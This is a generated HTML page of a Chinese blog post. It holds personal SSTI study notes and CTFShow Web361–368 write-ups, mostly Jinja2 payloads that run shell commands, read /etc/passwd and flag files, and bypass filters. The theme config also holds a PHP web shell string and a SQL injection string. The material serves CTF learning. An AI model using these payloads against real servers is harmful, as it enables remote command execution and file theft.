@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yansui">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://yan5ui.github.io/2023/08/07/ssti/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="SSTI学习笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI">
+<meta property="og:url" content="http://yan5ui.github.io/2023/08/07/SSTI/index.html">
+<meta property="og:site_name" content="yansui&#39;s blogs">
+<meta property="og:description" content="SSTI学习笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-07T09:49:10.024Z">
+<meta property="article:modified_time" content="2023-08-07T11:43:42.994Z">
+<meta property="article:author" content="yansui">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/uploads/favicon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/uploads/favicon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/uploads/favicon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SSTI -
+        
+        yansui&#39;s blogs
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"yan5ui.github.io","root":"/","language":"zh-CN"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/uploads/light.png","dark":"/uploads/night.png"},"title":"~yansui的成长记录~","subtitle":{"text":["eval($_POST[1])","1' union select 1,2,database();--+","{{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FFC0CB","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yan5ui","instagram":null,"zhihu":"https://www.zhihu.com/people/yan-sui-52-46","twitter":null,"email":"yansuij@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023-6-27"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                yansui&#39;s blogs
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">SSTI</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/uploads/photo.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">yansui</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-07 17:49:10</span>
+        <span class="mobile">2023-08-07 17:49:10</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-08-07 19:43:42</span>
+            <span class="mobile">2023-08-07 19:43:42</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="SSTI学习笔记"><a href="#SSTI学习笔记" class="headerlink" title="SSTI学习笔记"></a>SSTI学习笔记</h1><span id="more"></span>
+
+<h2 id="一、啥事SSTI"><a href="#一、啥事SSTI" class="headerlink" title="一、啥事SSTI"></a>一、啥事SSTI</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989" >学习文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>__mro__魔术方法：</p>
+<h2 id="二、常用payload"><a href="#二、常用payload" class="headerlink" title="二、常用payload(?)"></a>二、常用payload(?)</h2><p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/93746437" >感觉这个总结的不错 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/111399386" >这篇很好！！可以跟着上手实操一下 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>抄一下可能使用的：</p>
+<p>读文件</p>
+<p>RCE<br>python3:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>python2:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">60</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>both:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+<p>利用config进行RCE:<code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() &#125;&#125; </code></p>
+<p>读文件<br>python3:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>python2:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).readlines()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="三、常用bypass"><a href="#三、常用bypass" class="headerlink" title="三、常用bypass"></a>三、常用bypass</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/111399386" >再贴一遍，写的太好了，参考文章后半部分的bypass部分 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="四、CTFShow题解"><a href="#四、CTFShow题解" class="headerlink" title="四、CTFShow题解"></a>四、CTFShow题解</h2><h3 id="Web361"><a href="#Web361" class="headerlink" title="Web361"></a>Web361</h3><p>还得一步一步来 先找所有子类<br>payload:<br><code>?name=&#123;&#123;().__class__.__mro__[-1].__subclasses__()&#125;&#125;</code><br>跑能用的方法<br>跑出来是132：</p>
+<blockquote>
+<p>132—&gt; &lt;class ‘os._wrap_close’&gt;<br>加上</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
+<p>即可RCE</p>
+<p>最终payload:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Web362"><a href="#Web362" class="headerlink" title="Web362"></a>Web362</h3><p>上一题的payload先试试：<br>返回一个:(应该是被过滤了</p>
+<p>使用config进行RCE可以bypass，也看到利用全角数字绕过过滤的方法，附上脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">s=<span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    t+=<span class="string">&#x27;\&#x27;&#x27;</span>+half2full(i)+<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment">#&#x27;０&#x27;,&#x27;１&#x27;,&#x27;２&#x27;,&#x27;３&#x27;,&#x27;４&#x27;,&#x27;５&#x27;,&#x27;６&#x27;,&#x27;７&#x27;,&#x27;８&#x27;,&#x27;９&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>payload:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat ../flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Web363"><a href="#Web363" class="headerlink" title="Web363"></a>Web363</h3><p>过滤引号，参考上面的博客中的bypass方法，使用request</p>
+<p>payload:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Web364"><a href="#Web364" class="headerlink" title="Web364"></a>Web364</h3><p>先看看上一题的payload能不能梭哈</p>
+<p>过滤了request.args.***,可以直接用request.cookies.arg1</p>
+<p>payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie:arg1=<span class="built_in">open</span>;arg2=/flag</span><br></pre></td></tr></table></figure></div>
+<h3 id="Web365"><a href="#Web365" class="headerlink" title="Web365"></a>Web365</h3><p>还是先试试上一题的payload</p>
+<p>过滤了中括号</p>
+<p>可以用__getitem__<br>payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">132</span>).__init__.__globals__.__builtins__.__getitem__(request.cookies.arg1)(request.cookies.arg2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie:arg1=<span class="built_in">open</span>;arg2=/flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Web366"><a href="#Web366" class="headerlink" title="Web366"></a>Web366</h3><p>还是先试试上一题的payload</p>
+<p>进一步过滤了下划线</p>
+<p>使用十六进制编码bypass</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>].[<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>].[<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>](<span class="number">0</span>).[<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f]&quot;</span>().[<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>](<span class="number">132</span>).[<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>].[<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>].[<span class="string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>].[<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>](request.cookies.arg1)(request.cookies.arg2).read()&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>大意了，过滤了引号，上面那个payload用不了</p>
+<p>但是还可以用request</p>
+<p>payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().request.cookies.a.request.cookies.b.request.cookies.c(<span class="number">0</span>).request.cookies.d().request.cookies.c(<span class="number">132</span>).request.cookies.e.request.cookies.f.request.cookies.g.request.cookies.c(request.cookies.arg1)(request.cookies.arg2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie: a=__class__;b=__bases__;c=__getitem__;d=__subclasses__;e=__init__;f=__globals__;g=__builtins__;arg1=<span class="built_in">open</span>;arg2=/flag</span><br></pre></td></tr></table></figure></div>
+
+<p>还是不行 破防了</p>
+<p>实在不会了 抄一下别的师傅的</p>
+<p>payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看看下面这篇博客，讲的比较清楚</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44576725/article/details/124176797" >https://blog.csdn.net/weixin_44576725&#x2F;article&#x2F;details&#x2F;124176797 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Web367"><a href="#Web367" class="headerlink" title="Web367"></a>Web367</h3><p>过滤了os，用get+cookie来bypass:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie:a=__globals__;b=os;c=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Web368"><a href="#Web368" class="headerlink" title="Web368"></a>Web368</h3><p>payload:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span>(lipsum|attr(request.cookies.a)).get(request.cookies.b).popen(request.cookies.c).read() %&#125;</span><br><span class="line"></span><br><span class="line">Cookie:a=__globals__;b=os;c=cat /flag</span><br></pre></td></tr></table></figure></div>
+
+<p>SSTI还有四道题目 但是不太做得动了，先这样吧 下次再来做SSTI也不知道是啥时候了，比赛遇到再说</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> SSTI</li>
+        <li><strong>作者:</strong> yansui</li>
+        <li><strong>创建于:</strong> 2023-08-07 17:49:10</li>
+        
+            <li>
+                <strong>更新于:</strong> 2023-08-07 19:43:42
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://yansui.xyz/2023/08/07/SSTI/
+        </li>
+        <li>
+            <strong>版权声明:</strong> 本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/08/05/XXE/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">XXE漏洞学习与总结</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-swup-reload-script>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">SSTI</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-text">SSTI学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%95%A5%E4%BA%8BSSTI"><span class="nav-text">一、啥事SSTI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E7%94%A8payload"><span class="nav-text">二、常用payload(?)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E7%94%A8bypass"><span class="nav-text">三、常用bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81CTFShow%E9%A2%98%E8%A7%A3"><span class="nav-text">四、CTFShow题解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web361"><span class="nav-text">Web361</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web362"><span class="nav-text">Web362</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web363"><span class="nav-text">Web363</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web364"><span class="nav-text">Web364</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web365"><span class="nav-text">Web365</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web366"><span class="nav-text">Web366</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web367"><span class="nav-text">Web367</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web368"><span class="nav-text">Web368</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yansui</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
